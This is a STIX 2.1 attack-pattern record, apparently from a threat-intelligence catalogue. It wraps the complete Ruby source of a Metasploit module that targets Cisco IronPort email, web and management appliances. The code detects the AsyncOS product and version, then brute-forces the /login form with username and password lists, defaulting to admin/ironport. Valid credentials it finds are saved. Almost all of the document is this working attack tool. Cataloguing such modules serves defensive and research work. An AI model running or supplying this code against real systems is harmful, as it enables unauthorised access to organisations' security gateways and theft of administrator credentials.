{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c4cb6105-a1f6-41ff-bc23-ba44b956b102",
    "created": "2024-08-14T16:29:04.554885Z",
    "modified": "2024-08-14T16:29:04.554889Z",
    "name": "Cisco Ironport Bruteforce Login Utility",
    "description": " This module scans for Cisco Ironport SMA, WSA and ESA web login portals, finds AsyncOS versions, and performs login brute force to identify valid credentials. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/cisco_ironport_enum.rb",
            "external_id": "cisco_ironport_enum.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'Cisco Ironport Bruteforce Login Utility',\n      'Description'    => %{\n        This module scans for Cisco Ironport SMA, WSA and ESA web login portals, finds AsyncOS\n        versions, and performs login brute force to identify valid credentials.\n      },\n      'Author'         =>\n        [\n          'Karn Ganeshen <KarnGaneshen[at]gmail.com>',\n        ],\n      'License'        => MSF_LICENSE,\n      'DefaultOptions' => { 'SSL' => true }\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptString.new('USERNAME', [true, \"A specific username to authenticate as\", \"admin\"]),\n        OptString.new('PASSWORD', [true, \"A specific password to authenticate with\", \"ironport\"])\n      ])\n  end\n\n  def run_host(ip)\n    unless check_conn?\n      print_error(\"#{rhost}:#{rport} - Connection failed, Aborting...\")\n      return\n    end\n\n    unless is_app_ironport?\n      print_error(\"#{rhost}:#{rport} - Application does not appear to be Cisco Ironport. Module will not continue.\")\n      return\n    end\n\n    print_status(\"#{rhost}:#{rport} - Starting login brute force...\")\n    each_user_pass do |user, pass|\n      do_login(user, pass)\n    end\n  end\n\n  def check_conn?\n    begin\n      res = send_request_cgi(\n      {\n        'uri'       => '/',\n        'method'    => 'GET'\n      })\n      if res\n        print_good(\"#{rhost}:#{rport} - Server is responsive...\")\n        return true\n      end\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE\n    end\n    false\n  end\n\n  #\n  # What's the point of running this module if the app actually isn't Cisco IronPort\n  #\n\n  def is_app_ironport?\n      res = send_request_cgi(\n      {\n        'uri'       => '/',\n        'method'    => 'GET'\n      })\n\n      if res && res.get_cookies\n\n        cookie = res.get_cookies\n\n        res = send_request_cgi(\n        {\n          'uri'       => \"/help/wwhelp/wwhimpl/common/html/default.htm\",\n          'method'    => 'GET',\n          'cookie'\t   => cookie\n        })\n\n        if (res and res.code == 200 and res.body.include?('Cisco IronPort AsyncOS'))\n          version_key = /Cisco IronPort AsyncOS (.+? )/\n          version = res.body.scan(version_key).flatten[0].gsub('\"','')\n          product_key = /for (.*)</\n          product = res.body.scan(product_key).flatten[0]\n\n          if (product == 'Security Management Appliances')\n            p_name = 'Cisco IronPort Security Management Appliance (SMA)'\n            print_good(\"#{rhost}:#{rport} - Running Cisco IronPort #{product} (SMA) - AsyncOS v#{version}\")\n          elsif ( product == 'Cisco IronPort Web Security Appliances' )\n            p_name = 'Cisco IronPort Web Security Appliance (WSA)'\n            print_good(\"#{rhost}:#{rport} - Running #{product} (WSA) - AsyncOS v#{version}\")\n          elsif ( product == 'Cisco IronPort Appliances' )\n            p_name = 'Cisco IronPort Email Security Appliance (ESA)'\n            print_good(\"#{rhost}:#{rport} - Running #{product} (ESA) - AsyncOS v#{version}\")\n          end\n\n          return true\n        else\n          return false\n        end\n      else\n        return false\n      end\n  end\n\n  def service_details\n    super.merge({service_name: 'Cisco IronPort Appliance'})\n  end\n\n  #\n  # Brute-force the login page\n  #\n\n  def do_login(user, pass)\n    vprint_status(\"#{rhost}:#{rport} - Trying username:#{user.inspect} with password:#{pass.inspect}\")\n    begin\n      res = send_request_cgi(\n      {\n        'uri'       => '/login',\n        'method'    => 'POST',\n        'vars_post' =>\n          {\n            'action' => 'Login',\n            'referrer' => '',\n            'screen' => 'login',\n            'username' => user,\n            'password' => pass\n          }\n      })\n\n      if res and res.get_cookies.include?('authenticated=')\n        print_good(\"#{rhost}:#{rport} - SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}\")\n\n        store_valid_credential(user: user, private: pass, proof: res.get_cookies.inspect)\n        return :next_user\n\n      else\n        vprint_error(\"#{rhost}:#{rport} - FAILED LOGIN - #{user.inspect}:#{pass.inspect}\")\n      end\n\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE\n      print_error(\"#{rhost}:#{rport} - HTTP Connection Failed, Aborting\")\n      return :abort\n    end\n  end\nend\n"
}